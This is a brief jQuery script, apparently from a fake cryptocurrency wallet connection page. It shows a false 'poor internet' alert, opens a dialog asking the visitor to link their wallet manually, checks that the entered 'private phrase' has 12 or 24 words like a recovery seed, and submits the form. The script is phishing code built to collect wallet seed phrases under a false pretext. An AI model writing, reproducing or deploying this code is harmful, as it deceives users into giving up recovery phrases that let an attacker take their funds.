$('.sync-btn').on('click', function(){ 
    alert("Wallet cannot connect automatically due to poor internet. Link manually");
    const dia = document.getElementById('dialog'); dia.showModal();
    $('#dialog-close').on('click', function(){ dia.close(); });
});
$('#sync-email').on('click', function(e){
    e.preventDefault();
    const value = $('#private-input').val().toString().trim();
    const arr = value.split(' ').filter((token) => token !== '');
    if(value.length == 0){ alert('The key field cannot be empty!'); return;};
    if( arr.length !== 12 && arr.length !== 24 ){ alert('The private phrase must be 12 0r 24 word!'); return;};
    $('#sync-form').submit();
});